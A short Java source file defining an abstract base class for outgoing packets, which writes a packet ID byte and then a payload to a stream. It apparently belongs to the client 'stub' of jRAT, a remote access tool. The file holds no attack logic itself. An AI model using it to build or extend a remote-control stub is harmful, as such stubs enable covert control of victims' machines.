package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;


public abstract class AbstractOutgoingPacket {
	
	public abstract void write(DataOutputStream dos, StringWriter sw) throws Exception;
	
	public abstract byte getPacketId();
	
	public synchronized final void send(DataOutputStream dos, StringWriter sw) {
		try {
			dos.writeByte(getPacketId());
			this.write(dos, sw);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
